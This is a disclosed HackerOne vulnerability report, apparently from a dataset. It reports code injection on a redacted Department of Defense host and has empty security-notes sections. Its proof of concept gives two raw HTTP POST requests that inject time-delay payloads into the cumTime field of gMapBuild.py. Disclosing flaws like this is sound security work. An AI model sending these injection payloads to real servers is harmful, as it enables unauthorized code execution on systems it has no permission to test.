---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '954398'
original_report_id: '954398'
title: Сode injection host  █████████
weakness: Code Injection
team_handle: deptofdefense
created_at: '2020-08-09T14:54:50.051Z'
disclosed_at: '2020-09-03T17:27:02.127Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- code-injection
---

# Сode injection host  █████████

## Metadata

- HackerOne Report ID: 954398
- Weakness: Code Injection
- Program: deptofdefense
- Disclosed At: 2020-09-03T17:27:02.127Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Good day,  security team. Host █████████ vulnerable to code injection.
POC
The server makes a time delay.

POST /cgi-bin/gMapBuild.py HTTP/1.1
Host: ███
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Connection: close

mapArea=colP&cumTime=${{"sleep"%2c"13"})}${{"timeout"%2c"13"})}

or

POST /cgi-bin/gMapBuild.py HTTP/1.1
Host: ██████████
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
Connection: close

mapArea=colP&cumTime=${sleep(hexdec(dechex(13)))}${sleep(hexdec(dechex(13)))}

## Impact

Potential execution of arbitrary code.
https://owasp.org/www-community/attacks/Code_Injection

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
